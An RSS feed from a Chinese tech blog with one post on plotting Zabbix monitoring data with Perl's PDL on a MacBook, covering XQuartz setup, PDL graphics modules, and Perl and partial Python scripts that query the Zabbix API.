<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>IT干货网</title>
    <description>[科技与互联网干货]</description>
    <link>http://iftti.com/</link>
    <atom:link href="http://iftti.com/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 27 Jul 2014 14:10:14 +0800</pubDate>
    <lastBuildDate>Sun, 27 Jul 2014 14:10:14 +0800</lastBuildDate>
    <generator>Jekyll v2.1.0</generator>
    
      <item>
        <title>在 MacBook 上使用 PDL 绘图 </title>
        <description>

  
  &lt;div style=&quot;background-color: #FFF;&quot;&gt;
    &lt;p&gt;之前在 Linux 服务器上使用 PDL，主要是一些矩阵函数，这次准备在个人电脑上使用 PDL，尤其是本身的绘图功能，其一目的就是导出 zabbix 中存储的监控数据，通过 PDL 绘图观察其季节性分布情况。&lt;/p&gt;

&lt;p&gt;不过在使用的时候，发现在 MacBook 上跑 PDL 还是有点上手难度的。和 pylab 不同，PDL 是使用了 X11 的，而 MacBook 最新的版本里，X11 已经不再是自带的了。所以需要单独去下载 &lt;a href=&quot;https://www.macupdate.com/app/mac/26593/xquartz&quot;&gt;XQuartz&lt;/a&gt; 安装包来提供 X11 支持。&lt;/p&gt;

&lt;p&gt;安装好了 XQuartz 以后，再安装 PDL::Graphics:: 名字空间下的几个模块就好办了。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;PDL::Graphics::Simple&lt;/li&gt;
  &lt;li&gt;PDL::Graphics::Gnuplot&lt;/li&gt;
  &lt;li&gt;PDL::Graphics::PGPLOT&lt;/li&gt;
  &lt;li&gt;PDL::Graphics::Prima&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外还有 PDL::Graphics::PLplot 等，不过通过 &lt;code&gt;port install plplot&lt;/code&gt; 安装的 plplot 没有 header 文件，所以 PDL::Graphics::PLplot 是安装不上的，既然前面已经有了不少，这里也就不再追求自己下载 plplot 源代码来安装了。&lt;/p&gt;

&lt;p&gt;PDL::Graphics::Simple 是 《PDL Book》开篇第一个示例就使用的模块，其实际就是按顺序尝试加载 &lt;code&gt;::Gnuplot&lt;/code&gt;、&lt;code&gt;::PGPLOT&lt;/code&gt;、&lt;code&gt;::PLplot&lt;/code&gt; 和 &lt;code&gt;::Prima&lt;/code&gt;。所以，保证有一个可用就好了。&lt;/p&gt;

&lt;p&gt;不过在我的 air 上实际的效果来看，perldl 命令在使用 子进程跟 gnuplot 交互的时候&lt;strong&gt;非常非常非常的慢！&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;好了，现在就可以运行程序了：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;utf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;feature&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;:5.16&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Path::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tiny&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;YAML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PDL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PDL::Graphics::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PGPLOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Zabbix2::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;API&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;config.yml&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;slurp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$zbconf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;zabbix&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$zabbix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
  &lt;span class=&quot;nn&quot;&gt;Zabbix2::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;API&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://$zbconf-&amp;gt;{&#39;addr&#39;}/zabbix/api_jsonrpc.php&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$zabbix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$zbconf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;user&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$zbconf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;pass&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;could not authenticate&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$items&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$zabbix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;Item&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;groupids&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hostids&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11036&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;graphids&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1824829&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;@$items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;say&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$itemid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;itemid&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;say&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$itemid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sitems&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$zabbix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetch_single&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&#39;Item&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;itemids&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$itemid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pdl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sitems&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;history&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_from&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3600&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pdl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这里使用了 &lt;a href=&quot;https://metacpan.org/pod/Zabbix2::API&quot;&gt;Zabbix2::API&lt;/a&gt; 模块，相对比 &lt;a href=&quot;http://blog.zabbix.com/getting-started-with-zabbix-api/1381/&quot;&gt;zabbix 官方博客示例&lt;/a&gt;直接使用 &lt;a href=&quot;https://metacpan.org/pod/JSON::RPC&quot;&gt;JSON::RPC&lt;/a&gt; 模块，以及 python 的 pyzabbix 模块来说，Zabbix2::API 模块封装的非常好，history 是作为 item 对象的属性出现，而不是单独再请求一次 &lt;code&gt;history.get&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;另外，不知道为什么，使用 pyzabbix 模块就一直无法正常使用，而自己写 requests 和 json 却没问题。上面的 perl 脚本用 python 改写就是下面这样：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;Read item history from zabbix, and plot as histogram&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;matplotlib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;numpy&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;np&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;matplotlib.mlab&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;mlab&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;matplotlib.pyplot&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;plt&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ZABBIX_URI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;http://test.zabbix.com/zabbix/api_jsonrpc.php&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ZABBIX_USR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;user&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ZABBIX_PWD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;pass&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;HOURS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;zabbixLogin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;user&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zabbixCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;user.login&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;zabbixCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;jsonrpc&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;2.0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;method&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;params&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;auth&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZABBIX_URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;content-type&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;application/json-rpc&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;result&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;authId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zabbixLogin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZABBIX_USR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZABBIX_PWD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;Get Auth ID: &#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&#39;groupids&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&#39;hostids&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11036&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&#39;graphids&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1824829&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;items&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zabbixCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;item.get&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

